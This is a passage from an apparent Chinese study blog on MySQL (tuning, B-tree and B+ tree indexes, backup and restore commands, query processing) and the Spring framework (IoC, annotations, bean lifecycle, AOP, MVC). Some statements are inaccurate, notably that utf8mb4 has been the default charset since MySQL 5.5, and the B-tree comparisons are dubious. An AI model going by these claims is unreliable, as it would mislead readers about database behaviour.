<li>使用SHOW STATUS或SHOW GLOBAL STATUS命令查看MySQL性能统计信息；</li>
<li>采用监控工具进行实时监控，如Nagios、Zabbix等。</li>
</ul>
<p>总而言之，在调优MySQL时需要综合考虑硬件、操作系统、数据库参数等各方面因素，对于常见的优化点进行一一梳理和测试，以找到最佳配置参数。</p>
<h1 id="B树、B-树"><a href="#B树、B-树" class="headerlink" title="B树、B+树"></a>B树、B+树</h1><p>B树和B+树都是常见的数据库索引结构，用于优化对数据库的查询操作。它们有些类似，但又有不同。</p>
<ol>
<li>B树</li>
</ol>
<p>B树（B-tree）是一种自平衡树形索引结构，通常用于磁盘或其他直接存取外存储设备的文件系统。B树允许在对数时间内进行搜索、插入和删除等操作。B树的特点：</p>
<ul>
<li>每个节点可以包含多个键值和链接；</li>
<li>所有叶子节点都位于同一层级，并且不含信息，只包含指向数据存储位置的指针；</li>
<li>非叶子节点的关键字作为索引；</li>
</ul>
<ol start="2">
<li>B+树</li>
</ol>
<p>B+树（B-plus tree）也是一种自平衡树形结构，其基本原理与B树相似，但在实现细节上有所不同，主要用于数据库和操作系统中。B+树的特点：</p>
<ul>
<li>所有叶子节点包含全部的关键字和记录指针；</li>
<li>各叶子节点通过指针连接成一个有序链表；</li>
<li>内部节点不包含具体的数据，只包含索引信息；</li>
<li>相较于B树而言，B+树更适用于范围查询。</li>
</ul>
<p>比较：</p>
<p>B+树优于B树的地方：</p>
<ul>
<li>对于查找和范围查找，B+树只需要遍历叶子节点一次即可完成操作，而B树需要在内部节点和叶子节点都进行查找，因此B+树查询效率更高；</li>
<li>非叶子节点仅存储键值信息，可以容纳更多的索引项，从而降低树的高度，提高查询速度；</li>
<li>B+树所有叶子节点形成一个双向链表，可以方便地支持区间查找和遍历。</li>
</ul>
<p>B树优于B+树的地方：</p>
<ul>
<li>B树对于随机读取和插入数据有较好的性能，同时也不易受到磁盘块大小等参数的影响。B+树相对而言只适用于顺序访问和插入数据的情况；</li>
<li>B树的非叶子节点和叶子节点的处理方式相同，实现较为简单，B+树则需要特殊的处理。</li>
</ul>
<p>总体而言，B+树的广泛应用是由于其范围查询的效率极高，并且其结构使得查询很容易地通过迭代来实现。</p>
<h1 id="备份和恢复数据库"><a href="#备份和恢复数据库" class="headerlink" title="备份和恢复数据库"></a>备份和恢复数据库</h1><p>MySQL有多种备份数据库的方式，包括物理备份和逻辑备份，在备份时，需要根据实际情况选择最合适的备份方式，并保证备份数据的一致性、完整性和安全性。</p>
<ol>
<li>物理备份</li>
</ol>
<p>物理备份是指直接备份MySQL服务器中数据文件的一种方式。这种备份方式直接将数据文件复制到指定的备份目录下，并保持与原始数据文件的完全一致，因此恢复时也很快速。</p>
<p>物理备份包括两种主要类型：</p>
<ul>
<li>冷备份：停止MySQL服务后备份数据文件，优点是备份数据的一致性好，缺点是在备份期间无法进行数据库操作。</li>
<li>热备份：不停止MySQL服务进行备份，优点是可以在备份时继续对数据库进行操作，缺点是备份数据可能会因为正在执行的事务而不完整或不一致。</li>
</ul>
<p>物理备份的命令可以使用Linux中的cp、rsync等命令，例如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> -a /var/lib/mysql /backup/mysql_backup</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li>逻辑备份</li>
</ol>
<p>逻辑备份是指通过SQL语句来生成备份文件，备份数据以可读性较好的文本格式保存，因此备份数据相对于物理备份较大，但可以进行较为精细的筛选和处理。</p>
<p>逻辑备份包括以下主要类型：</p>
<ul>
<li>mysqldump：可以备份指定的数据库或表，甚至可以备份数据库中的指定数据，生成.sql格式的备份文件。</li>
<li>mydumper：适用于大型数据库，生成多个文件来备份数据。</li>
<li>mysqlpump：在MySQL8.0及以上版本中提供了mysqlpump命令，该命令比mysqldump更快，也支持多线程和压缩。</li>
</ul>
<p>例如，使用mysqldump备份一个名为mydatabase的数据库：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mysqldump -u root -p mydatabase &gt; mydatabase_backup.sql</span><br></code></pre></td></tr></table></figure>

<p>在备份时，需要注意一些重要的问题：</p>
<ol>
<li>备份文件应当保存在安全的位置，并进行良好的加密措施。</li>
<li>常规的备份操作应当建立合理的时间间隔。</li>
<li>对于生产环境的数据库，建议还使用主从复制等业务高可用方案来增加数据可靠性。</li>
</ol>
<p>恢复MySQL备份文件则相对较简单，可以使用以下命令进行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mysql -u root -p mydatabase &lt; mydatabase_backup.sql</span><br></code></pre></td></tr></table></figure>

<p>其中，mydatabase是需要恢复的数据库的名称，mydatabase_backup.sql是备份文件的路径。执行后，MySQL会将备份文件中的数据导入到MySQL服务器中，并重新生成所有的索引和约束条件，以保证数据的正确性和完整性。</p>
<p>在MySQL中，如果备份文件中的数据字符编码与目标数据库不一致，恢复数据时可能会出现乱码等问题。为了避免这种情况，可以通过指定字符集参数来将备份文件中的数据以正确的字符编码导入到目标数据库中。</p>
<p>以下是根据备份文件的字符集来重新设置字符集的命令示例：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mysql -u root -p mydatabase --default-character-set=utf8 &lt; backup.sql</span><br></code></pre></td></tr></table></figure>

<p>其中，mydatabase是需要恢复的数据库的名称，backup.sql是备份文件的路径。–default-character-set选项用于指定字符集，可以根据实际情况设置编码类型和字符集。如果备份文件的字符编码为GBK，则可以将上述命令修改如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mysql -u root -p mydatabase --default-character-set=gbk &lt; backup.sql</span><br></code></pre></td></tr></table></figure>

<p>在MySQL 5.5及以上版本中，默认的字符集为utf8mb4，因此如果备份文件中使用的是utf8或gbk等字符集，也需要显式地指定字符集参数。</p>
<p>另外，在备份时也应当考虑到字符编码的问题，建议在备份时同时备份字符集相关的信息。例如，在进行逻辑备份时，可以添加–set-charset选项来确保备份数据使用与数据库相同的字符集。例如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mysqldump -u root -p mydatabase --set-charset &gt; mydatabase_backup.sql</span><br></code></pre></td></tr></table></figure>

<p>这样，在恢复数据时就无需再指定字符集，MySQL会自动使用与备份时相同的字符集导入数据。</p>
<h1 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h1><p>MySQL数据查询的主要过程：</p>
<ol>
<li><p>查询缓存</p>
<p>MySQL会缓存查询结果，如果在缓存期间发生了数据更改，则缓存失效，会被删除。如果数据没有更改，则对于完全一致且不存在某些会改变查询含义的函数如NOW()，就会直接返回缓存中的内容。</p>
<p>但是维护缓存是需要开销的，包括查询缓存、添加缓存、删除缓存、维护缓存内存区域。所以MySQL从5.7.20开始不推荐使用MySQL缓存功能，在MySQL8.0中直接将其删除了。</p>
</li>
<li><p>语法解析</p>
<p>属于编译过程，涉及词法分析、语法分析、语义分析等。</p>
</li>
<li><p>查询优化</p>
</li>
</ol>
<p>索引不适用的条件<br>索引列上有函数，不满足最左前缀，使用了不等号，使用了范围查询等等<br>索引的分类<br>B-Tree索引， Hash索引，全文索引，单值索引、唯一索引、复合索引<br>聚簇索引、非聚簇索引等等，</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-05T13:02:38.000Z" title="2023/5/5 21:02:38">2023-05-05</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-24T08:07:34.393Z" title="2023/5/24 16:07:34">2023-05-24</time></span><span class="level-item">35 minutes read (About 5301 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/05/Spring/">Spring</a></p><div class="content"><h1 id="Spring特性"><a href="#Spring特性" class="headerlink" title="Spring特性"></a>Spring特性</h1><p>Spring基于J2EE技术实现了一套轻量的Java Web Service系统应用框架，有很多优秀的特性，包括，依赖注入（DI）、控制反转（IoC）、面向切面（AOP）、轻量、灵活</p>
<ol>
<li>控制反转<ol>
<li>指的是对象依赖的对象，将会在容器的初始化完成后会主动传递给对象，而不需要对象自己创建或查询其依赖的对象，实现了系统对象之间依赖的解耦</li>
<li>Spring通过依赖注入实现控制反转，依赖注入是一种设计模式，通过该模式，对象不再创建或管理它们所需要的其他对象或服务，而是由容器（例如Spring容器）负责创建和管理这些对象或服务，并注入到需要它们的对象中。</li>
</ol>
</li>
<li>面向切面<ol>
<li>面向切面是一种编程范式，用于将系统的横切关注点（如安全性、事务、日志记录等）与业务逻辑分离</li>
<li>面向切面通过将横切关注点划分为独立的模块，并在运行时动态地将这些模块植入到程序中，从而实现了对业务逻辑的无侵入式增强</li>
<li>Spring AOP通过使用动态代理技术来实现对目标对象的增强</li>
</ol>
</li>
<li>轻量<ol>
<li>spring-web-5.2.0.RELEASE.jar和spring-core-5.2.0.RELEASE.jar均仅有1.4M左右</li>
<li>只需要少量的操作系统资源</li>
</ol>
</li>
<li>灵活<ol>
<li>是模块化的，可以按需引入模块（以jar包依赖的方式引入）</li>
</ol>
</li>
</ol>
<h1 id="Spring的核心JAR包"><a href="#Spring的核心JAR包" class="headerlink" title="Spring的核心JAR包"></a>Spring的核心JAR包</h1><p>Spring是模块化实现的，每个模块对应不同的JAR包</p>
<p>Spring框架的所有JAR包：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>spring-aop</td>
<td>提供了Spring框架的面向切面编程（AOP）功能，用于在运行时动态地增强应用程序的功能。</td>
</tr>
<tr>
<td>spring-aspects</td>
<td>提供了Spring框架的切面库，包括对AspectJ切面的支持和一些通用切面的实现。</td>
</tr>
<tr>
<td>spring-beans</td>
<td>提供了Spring框架的BeanFactory和FactoryBean等工厂类，用于管理和配置应用程序中的对象。</td>
</tr>
<tr>
<td>spring-context</td>
<td>提供了Spring框架的应用上下文（ApplicationContext），用于管理应用程序中的Bean对象，以及Spring框架的事件驱动编程模型。</td>
</tr>
<tr>
<td>spring-context-indexer</td>
<td>提供了一个工具，用于在编译时为Spring应用程序生成索引文件，以提高应用程序启动的速度。</td>
</tr>
<tr>
<td>spring-context-support</td>
<td>提供了一些扩展类，用于在Spring应用程序中支持特定的应用场景，例如JPA、Velocity等。</td>
</tr>
<tr>
<td>spring-core</td>
<td>Spring框架的核心模块，提供了Spring框架的基本功能，如依赖注入、控制反转、Bean工厂等。</td>
</tr>
<tr>
<td>spring-expression</td>
<td>提供了Spring框架的表达式语言（SpEL），用于在应用程序中动态地访问和操作对象。</td>
</tr>
<tr>
<td>spring-instrument</td>
<td>提供了Spring框架的Instrumentation API支持，用于在运行时通过Java Agent来提供增强功能。</td>
</tr>
<tr>
<td>spring-instrument-tomcat</td>
<td>提供了Spring框架在Tomcat服务器中使用Instrumentation API的支持。</td>
</tr>
<tr>
<td>spring-jcl</td>
<td>提供了Spring框架的通用日志抽象库，可以在不同的日志实现之间进行切换。</td>
</tr>
<tr>
<td>spring-jdbc</td>
<td>提供了Spring框架的JDBC支持，包括对JdbcTemplate和NamedParameterJdbcTemplate等的封装。</td>
</tr>
<tr>
<td>spring-jms</td>
<td>提供了Spring框架的Java Message Service（JMS）支持，用于在应用程序中发送和接收消息。</td>
</tr>
<tr>
<td>spring-messaging</td>
<td>提供了Spring框架的消息处理功能，包括对WebSocket、STOMP、AMQP等协议的支持。</td>
</tr>
<tr>
<td>spring-orm</td>
<td>提供了Spring框架的对象关系映射（ORM）支持，包括对Hibernate、MyBatis等ORM框架的集成。</td>
</tr>
<tr>
<td>spring-oxm</td>
<td>提供了Spring框架的对象XML映射（OXM）支持，用于在Java对象和XML文档之间进行转换。</td>
</tr>
<tr>
<td>spring-test</td>
<td>提供了Spring框架的测试支持，包括对JUnit、TestNG等测试框架的集成，以及对Spring应用程序的集成测试支持。</td>
</tr>
<tr>
<td>spring-tx</td>
<td>提供了Spring框</td>
</tr>
</tbody></table>
<h1 id="Spring注解"><a href="#Spring注解" class="headerlink" title="Spring注解"></a>Spring注解</h1><p>Spring的注解将Bean的定义和依赖关系从XML配置中解放出来，应用程序只要使用注解依赖注入即可</p>
<p>Bean具体的定义和依赖关系由Spring的自动装配完成</p>
<h2 id="依赖注入相关注解"><a href="#依赖注入相关注解" class="headerlink" title="依赖注入相关注解"></a>依赖注入相关注解</h2><table>
<thead>
<tr>
<th>注解</th>
<th>翻译名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>@Autowired</td>
<td>自动注入</td>
<td>根据类型进行自动注入，如果有多个符合条件的Bean，可以通过指定名称或限定符来进行注入。</td>
</tr>
<tr>
<td>@Qualifier</td>
<td>限定符</td>
<td>与@Autowired一起使用，指定Bean的名称或限定符，以便进行注入。</td>
</tr>
<tr>
<td>@Resource</td>
<td>资源注入</td>
<td>根据名称进行自动注入，可以与指定类型或名称的方式进行限定。</td>
</tr>
<tr>
<td>@Value</td>
<td>属性注入</td>
<td>用于注入常量或表达式计算的结果值。</td>
</tr>
<tr>
<td>@Inject</td>
<td>JSR-330注解</td>
<td>与@Autowired类似，但具有更加灵活的限定符支持。</td>
</tr>
</tbody></table>
<h2 id="Bean定义相关注解"><a href="#Bean定义相关注解" class="headerlink" title="Bean定义相关注解"></a>Bean定义相关注解</h2><table>
<thead>
<tr>
<th>注解</th>
<th>翻译名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>@Component</td>
<td>通用组件</td>
<td>用于将类定义为Spring组件，并且可以与其他注解一起使用，如@Controller、@Service、@Repository等。</td>
</tr>
<tr>
<td>@Configuration</td>
<td>配置类</td>
<td>用于定义Spring应用程序的配置类，并且可以通过@Bean方法定义Bean对象。</td>
</tr>
<tr>
<td>@Bean</td>
<td>Bean定义</td>
<td>用于在配置类中定义Bean对象，并将其添加到Spring容器中。</td>
</tr>
<tr>
<td>@Profile</td>
<td>环境选择</td>
<td>用于基于不同的应用程序环境选择Bean定义，可以与@Conditional一起使用。</td>
</tr>
<tr>
<td>@Scope</td>
<td>Bean作用域</td>
<td>用于定义Bean对象的作用域，包括Singleton、Prototype、Request、Session等。</td>
</tr>
</tbody></table>
<h2 id="AOP相关注解"><a href="#AOP相关注解" class="headerlink" title="AOP相关注解"></a>AOP相关注解</h2><table>
<thead>
<tr>
<th>注解</th>
<th>翻译名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>@Aspect</td>
<td>切面定义</td>
<td>用于将类定义为切面，可以在其中定义切点和通知。</td>
</tr>
<tr>
<td>@Pointcut</td>
<td>切点定义</td>
<td>用于定义切点，指定连接点的匹配规则。</td>
</tr>
<tr>
<td>@Before</td>
<td>前置通知</td>
<td>在方法执行之前执行通知。</td>
</tr>
<tr>
<td>@After</td>
<td>后置通知</td>
<td>在方法执行之后执行通知。</td>
</tr>
<tr>
<td>@AfterReturning</td>
<td>返回通知</td>
<td>在方法执行之后返回结果后执行通知。</td>
</tr>
<tr>
<td>@AfterThrowing</td>
<td>异常通知</td>
<td>在方法执行时抛出异常后执行通知。</td>
</tr>
<tr>
<td>@Around</td>
<td>环绕通知</td>
<td>在方法执行之前和之后都可以执行通知。</td>
</tr>
</tbody></table>
<h2 id="Web相关注解"><a href="#Web相关注解" class="headerlink" title="Web相关注解"></a>Web相关注解</h2><table>
<thead>
<tr>
<th>注解</th>
<th>翻译名称</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>@Controller</td>
<td>控制器</td>
<td>用于将类定义为Spring MVC的控制器，处理HTTP请求并返回响应结果。</td>
</tr>
<tr>
<td>@RestController</td>
<td>REST控制器</td>
<td>与@Controller类似，但默认情况下返回JSON或XML格式的响应结果。</td>
</tr>
<tr>
<td>@RequestMapping</td>
<td>请求映射</td>
<td>用于将HTTP请求映射到处理方法上，并指定请求的URL、请求方法、请求参数等。</td>
</tr>
<tr>
<td>@GetMapping</td>
<td>GET请求映射</td>
<td>用于将HTTP GET请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@PostMapping</td>
<td>POST请求映射</td>
<td>用于将HTTP POST请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@PutMapping</td>
<td>PUT请求映射</td>
<td>用于将HTTP PUT请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@DeleteMapping</td>
<td>DELETE请求映射</td>
<td>用于将HTTP DELETE请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@PatchMapping</td>
<td>PATCH请求映射</td>
<td>用于将HTTP PATCH请求映射到处理方法上，简化了@RequestMapping的用法。</td>
</tr>
<tr>
<td>@PathVariable</td>
<td>路径变量</td>
<td>用于将URI中的变量绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@RequestParam</td>
<td>请求参数</td>
<td>用于将HTTP请求中的参数绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@RequestBody</td>
<td>请求体</td>
<td>用于将HTTP请求体中的数据绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@RequestHeader</td>
<td>请求头</td>
<td>用于将HTTP请求头中的数据绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@CookieValue</td>
<td>Cookie值</td>
<td>用于将HTTP Cookie中的值绑定到处理方法的参数上。</td>
</tr>
<tr>
<td>@ResponseBody</td>
<td>响应体</td>
<td>用于将处理方法的返回值作为HTTP响应体返回给客户端。</td>
</tr>
<tr>
<td>@ResponseStatus</td>
<td>响应状态码</td>
<td>用于指定处理方法的返回状态码。</td>
</tr>
<tr>
<td>@SessionAttributes</td>
<td>会话属性</td>
<td>用于在会话中存储处理方法的模型属性。</td>
</tr>
<tr>
<td>@ModelAttribute</td>
<td>模型属性</td>
<td>用于将请求参数绑定到模型属性上。</td>
</tr>
<tr>
<td>@InitBinder</td>
<td>初始化绑定器</td>
<td>用于初始化WebDataBinder，用于数据绑定和格式化等操作。</td>
</tr>
<tr>
<td>@ExceptionHandler</td>
<td>异常处理</td>
<td>用于处理控制器中抛出的异常。</td>
</tr>
<tr>
<td>@CrossOrigin</td>
<td>跨域资源共享</td>
<td>用于处理跨域请求，允许指定允许跨域请求的来源、方法和头信息等。</td>
</tr>
</tbody></table>
<h1 id="Spring-IoC原理"><a href="#Spring-IoC原理" class="headerlink" title="Spring IoC原理"></a>Spring IoC原理</h1><h2 id="IoC简介"><a href="#IoC简介" class="headerlink" title="IoC简介"></a>IoC简介</h2><p>Spring IoC通过Java反射功能实例化并建立Bean之间的依赖关系</p>
<p>Spring IoC在完成这些底层工作的基础上，还提供了Bean实例缓存管理、Bean生命周期管理、Bean实例代理、事件发布和资源装载等高级服务</p>
<h2 id="Bean的装配流程"><a href="#Bean的装配流程" class="headerlink" title="Bean的装配流程"></a>Bean的装配流程</h2><p>Spring通过读取XML或注解获取Bean的配置信息，并在Bean容器中生成Bean配置注册表，然后根据配置注册表实例化Bean，将Bean实例载入Bean缓存池，业务程序就可以从Bean缓存池中获取Bean</p>
<h2 id="Bean的作用域"><a href="#Bean的作用域" class="headerlink" title="Bean的作用域"></a>Bean的作用域</h2><p>Bean有五种作用域：</p>
<ul>
<li>Singleton：单例作用域，表示在 Spring IoC 容器中只存在一个 Bean 对象实例，所有对该 Bean 的请求都将返回该唯一实例。</li>
<li>Prototype：原型作用域，每次对该 Bean 的请求都将创建一个新的 Bean 实例。每次使用时都会创建新的对象。</li>
<li>Request：请求作用域，每个 HTTP 请求都将创建一个新的 Bean 实例，该 Bean 仅在当前 HTTP 请求中有效。</li>
<li>Session：会话作用域，每个 HTTP 会话都将创建一个新的 Bean 实例，该 Bean 仅在当前 HTTP 会话中有效。</li>
<li>GlobalSession：全局会话作用域，仅适用于使用基于 Portlet 的 web 应用。它是在一个全局的 Portlet 会话中共享的 Bean 实例。</li>
</ul>
<p>除了这五种标准作用域外，Spring 还支持自定义作用域。在 Spring 中，我们可以通过实现 Scope 接口并重写对应方法来实现自定义作用域。这样可以让我们更加灵活地管理 Bean 的生命周期，以满足应用程序的特定需求。</p>
<h2 id="Bean的生命周期"><a href="#Bean的生命周期" class="headerlink" title="Bean的生命周期"></a>Bean的生命周期</h2><p>Spring Bean 的生命周期是 Spring IoC 容器管理的重要部分，它由一系列的回调函数来控制。在 Spring 容器创建 Bean 实例对象时，会经历以下阶段：</p>
<ol>
<li><p>Bean 实例化：Spring IoC 容器通过反射机制实例化一个 Bean 对象，通常是使用默认的构造函数来创建 Bean 实例。</p>
</li>
<li><p>属性注入：Spring IoC 容器通过 setter 方法或者直接访问 Bean 属性来注入 Bean 的属性。</p>
</li>
<li><p>BeanPostProcessor 前置处理器：在 Bean 实例化之后，Spring IoC 容器会自动检测是否有实现了 BeanPostProcessor 接口的类，并调用它们的 postProcessBeforeInitialization() 方法来对 Bean 进行前置处理。</p>
</li>
<li><p>初始化：Spring IoC 容器调用 Bean 实现 InitializingBean 接口或者配置的 init-method 方法，执行 Bean 的初始化操作。</p>
</li>
<li><p>BeanPostProcessor 后置处理器：在 Bean 初始化之后，Spring IoC 容器会自动检测是否有实现了 BeanPostProcessor 接口的类，并调用它们的 postProcessAfterInitialization() 方法来对 Bean 进行后置处理。</p>
</li>
<li><p>使用：Bean 实例化完成并初始化后，就可以在应用程序中使用它了。</p>
</li>
<li><p>销毁：当 Spring IoC 容器关闭时，它会调用 Bean 实现 DisposableBean 接口或者配置的 destroy-method 方法，执行 Bean 的销毁操作。</p>
</li>
</ol>
<p>此外，Spring Bean 的生命周期可以被定制化，我们可以自定义 BeanPostProcessor 实现类或者配置 init-method 和 destroy-method 方法，来在 Bean 的生命周期中加入自己的逻辑处理。</p>
<p>BeanPostProcessor 前置处理器是 Spring IoC 容器中的一个扩展点，用于在 Bean 的初始化前进行额外的处理，可以对 Bean 对象进行修改或增强。BeanPostProcessor 接口定义了两个方法：</p>
<ol>
<li><p>postProcessBeforeInitialization(Object bean, String beanName)：在 Bean 初始化之前调用该方法，可以对 Bean 对象进行一些修改或增强操作。</p>
</li>
<li><p>postProcessAfterInitialization(Object bean, String beanName)：在 Bean 初始化之后调用该方法，可以对 Bean 对象进行一些修改或增强操作。</p>
</li>
</ol>
<p>在 Spring IoC 容器中，当一个 Bean 实例化完成后，会检查是否有实现了 BeanPostProcessor 接口的类，如果有，则会依次调用它们的 postProcessBeforeInitialization() 方法，然后进行 Bean 的初始化操作，最后再依次调用实现了 BeanPostProcessor 接口的类的 postProcessAfterInitialization() 方法。通过实现 BeanPostProcessor 接口，我们可以在 Bean 实例化前后进行一些自定义的操作，例如：</p>
<ol>
<li><p>为 Bean 注入日志处理、事务处理等公共的功能。</p>
</li>
<li><p>在 Bean 初始化前后进行性能监控、安全检查等操作。</p>
</li>
<li><p>对 Bean 进行代理，实现 AOP 的功能。</p>
</li>
</ol>
<p>需要注意的是，在实现 BeanPostProcessor 接口时，必须小心处理，以免破坏 Bean 的正常生命周期。同时，也应该尽量保持 BeanPostProcessor 的轻量级，避免对系统性能产生过大的影响。</p>
<p>总之，BeanPostProcessor 前置处理器是 Spring IoC 容器中的一个重要扩展点，通过实现该接口，可以在 Bean 实例化前后进行一些自定义的操作，从而增强 Bean 的功能和灵活性。</p>
<h1 id="Spring-AOP原理"><a href="#Spring-AOP原理" class="headerlink" title="Spring AOP原理"></a>Spring AOP原理</h1><h2 id="AOP简介"><a href="#AOP简介" class="headerlink" title="AOP简介"></a>AOP简介</h2><p>Spring AOP通过面向切面技术，将与业务无关或被业务模块共用的代码封装起来，以提高代码的复用度，降低模块间的耦合度</p>
<h2 id="AOP-的核心概念"><a href="#AOP-的核心概念" class="headerlink" title="AOP 的核心概念"></a>AOP 的核心概念</h2><table>
<thead>
<tr>
<th>概念</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>切面（Aspect）</td>
<td>对一个或多个横切关注点的封装，它包含了切点、通知和切点表达式等元素。切面定义了何时、何地以及如何将横切关注点织入到目标对象中。</td>
</tr>
<tr>
<td>切点（Pointcut）</td>
<td>目标对象中的一组方法或者类，它们将被织入到横切关注点中。切点通常由切点表达式和其他过滤条件组成。</td>
</tr>
<tr>
<td>通知（Advice）</td>
<td>在织入横切关注点时要执行的逻辑代码，它包括了前置通知、后置通知、环绕通知、异常通知和最终通知等不同类型。</td>
</tr>
<tr>
<td>切点表达式（Pointcut Expression）</td>
<td>一种指定切点的语法规则，它可以根据方法名、返回值类型、方法参数等多种条件进行切点匹配。</td>
</tr>
<tr>
<td>连接点（Join Point）</td>
<td>程序执行过程中的某个特定位置，例如方法调用、方法执行、异常抛出等。连接点是织入横切关注点的具体执行位置。</td>
</tr>
<tr>
<td>织入（Weaving）</td>
<td>将横切关注点应用到目标对象的过程，它可以通过代理模式实现。在 Spring AOP 中，织入分为编译期织入、类装载期织入和运行期织入三种方式。</td>
</tr>
</tbody></table>
<p>上述概念是 Spring AOP 技术中的核心要素，了解这些概念对于掌握和使用 Spring AOP 技术非常重要。切面、切点、通知和切点表达式是定义 AOP 配置的基础，连接点则表示切点匹配到的具体执行位置，织入则是实现 AOP 功能的核心机制。</p>
<h2 id="AOP横切关注点"><a href="#AOP横切关注点" class="headerlink" title="AOP横切关注点"></a>AOP横切关注点</h2><p>Srping将应用分为核心关注点和横切关注点两部分</p>
<ul>
<li><p>核心关注点（Core Concerns）是指应用程序的基本业务逻辑，例如数据访问、业务逻辑处理等。核心关注点是应用程序的主要功能，通常是由应用程序开发人员直接实现的。</p>
</li>
<li><p>横切关注点（Cross-Cutting Concerns）是指应用程序中与核心业务逻辑无关的横切问题，例如日志记录、事务管理、安全控制等。</p>
</li>
</ul>
<p>在 Spring AOP 中，横切关注点可以通过定义切面（Aspect）来实现。通常情况下，切面是一个 Java 类，其中包含了一些切点（Pointcut）、通知（Advice）和切点表达式（Pointcut Expression）等元素。</p>
<ul>
<li>切点（Pointcut）：用于定义一个或多个目标对象中哪些方法需要被织入横切关注点。</li>
<li>通知（Advice）：定义了横切关注点在目标对象中何时被执行以及执行的逻辑。</li>
<li>切点表达式（Pointcut Expression）：用于指定切点的匹配规则。</li>
</ul>
<p>Spring AOP 的实现是基于代理模式的，它通过创建代理对象来织入切面逻辑。Spring AOP 支持两种代理方式：JDK 动态代理和 CGLIB 代理。对于实现了接口的类，Spring AOP 将使用 JDK 动态代理来创建代理对象；对于没有实现接口的类，Spring AOP 将使用 CGLIB 代理来创建代理对象。</p>
<h2 id="AOP的5种通知类型"><a href="#AOP的5种通知类型" class="headerlink" title="AOP的5种通知类型"></a>AOP的5种通知类型</h2><p>Spring AOP 提供了以下五种类型的通知：</p>
<ul>
<li>前置通知（Before Advice）：在目标方法执行前执行。</li>
<li>后置通知（After Returning Advice）：在目标方法返回后执行。</li>
<li>环绕通知（Around Advice）：在目标方法执行前后都执行。</li>
<li>异常通知（After Throwing Advice）：在目标方法抛出异常时执行。</li>
<li>最终通知（After Advice）：无论目标方法是否正常执行完成，最终通知都会被执行。</li>
</ul>
<h2 id="AOP的应用"><a href="#AOP的应用" class="headerlink" title="AOP的应用"></a>AOP的应用</h2><table>
<thead>
<tr>
<th>应用场景</th>
<th>切面类型</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>日志记录</td>
<td>前置通知（Before）</td>
<td>在用户登录时记录登录时间和 IP 地址</td>
</tr>
<tr>
<td>性能监控</td>
<td>环绕通知（Around）</td>
<td>在对数据库进行查询时统计查询时间和资源占用情况</td>
</tr>
<tr>
<td>安全控制</td>
<td>前置通知（Before）</td>
<td>在访问受保护的资源时检查用户的身份和权限信息</td>
</tr>
<tr>
<td>事务管理</td>
<td>环绕通知（Around）</td>
<td>在对数据库进行更新操作时开启和提交事务</td>
</tr>
<tr>
<td>异常处理</td>
<td>异常通知（AfterThrowing）</td>
<td>在文件上传时捕获文件格式不正确等异常信息，并进行相应的处理</td>
</tr>
</tbody></table>
<h1 id="Spring-MVC原理"><a href="#Spring-MVC原理" class="headerlink" title="Spring MVC原理"></a>Spring MVC原理</h1><h2 id="MVC简介"><a href="#MVC简介" class="headerlink" title="MVC简介"></a>MVC简介</h2><p>Spring的MVC即模型-视图-控制器，该框架围绕DispatcherServlet设计而成，DispatcherServlet会把请求分发给各个处理器</p>
<p>SpringMVC 的工作流程主要包括以下几个步骤：</p>
<ol>
<li><p>客户端发送请求：客户端向服务器发送请求，请求可以是一个 URL 地址、一个表单提交或者一个 AJAX 请求。</p>
</li>
<li><p>DispatcherServlet 接收请求：DispatcherServlet 是 SpringMVC 框架的核心控制器，它负责接收客户端发送的请求，并将请求转发给对应的处理器。</p>
</li>
<li><p>HandlerMapping 查找处理器：HandlerMapping 负责根据请求 URL 查找对应的处理器，处理器可以是一个 Controller 或者一个 Restful Web Service。</p>
</li>
<li><p>HandlerAdapter 调用处理器：HandlerAdapter 负责调用处理器，将请求传递给处理器进行处理，并获取处理器的处理结果。</p>
</li>
<li><p>处理器处理请求：处理器根据请求的类型和参数，进行相应的业务处理，并返回一个 ModelAndView 对象。</p>
</li>
